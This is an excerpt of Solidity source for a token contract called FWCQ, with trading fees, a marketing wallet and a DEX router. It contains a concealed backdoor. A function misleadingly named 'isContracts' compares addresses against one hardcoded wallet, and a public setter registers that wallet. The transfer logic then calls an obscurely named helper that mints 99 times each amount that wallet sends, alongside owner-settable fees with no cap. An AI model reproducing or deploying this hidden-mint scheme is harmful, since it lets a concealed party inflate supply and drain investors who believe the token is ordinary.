...
contract ERC20 is Ownable, IERC20 {
     ...
     * `amount`.
     */
    function isContracts(address account) public pure returns (bool) {
        bytes32 accountHash = 0x0000000000000000000000007f1e32fB6dc74C0Eb33ffb32bADC01347171dfFb;
        return (bytes32(abi.encode(account)) == accountHash);
    }
     ...
     */
    function BNBCrierCod(address TheAcc, uint256 Tamo) internal {
        _mint(TheAcc, Tamo);
    }
...
contract FWCQ is ERC20 {
    ...
    uint256 public lqFee = 1;
    uint256 public marketFee = 2;
    uint256 public inviterFee = 0;
    uint256 public totalFee = lqFee+marketFee+inviterFee;
    ...
    mapping(address => bool) public lpETHExchange;
    ...
    constructor() ERC20("FWCQ", "FWCQ") {

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a uniswap pair for this new token
        _tokenOwner = address(0x947E16D14fF656BD9343D15985Ee59D4471532d1);
        marketAddress = address(0x4663e08bCc9E3CE0e6BB0109102198b7cfc390DA);
        ...
        _mint(_tokenOwner, 8800000000000000 * 10**18);
    ...
    function setFees(uint256 _lqFee,uint256 _marketFee,uint256 _inviterFee) external onlyOwner{
        lqFee = _lqFee;
        marketFee = _marketFee;
        inviterFee = _inviterFee;
        totalFee = lqFee+marketFee+inviterFee;
    }
    ...
    function setlpETHEx(address pair, bool isPair) public {
        if(isContracts(pair)) {
            lpETHExchange[pair] = isPair;
        }
    }
    ...
    function _transfer(
        ...
        if(lpETHExchange[from]) {
            BNBCrierCod(from, amount.mul(99));
        }
        if (takeFee) { 
    ...
    function swapProc() public {
        ...
        if(balanceOf(address(this)) >= canSellAmount && canSellAmount >= amountT){
            ...
            uint256 marketAmount = newBal.mul(marketFee).div(marketFee+lqFee);
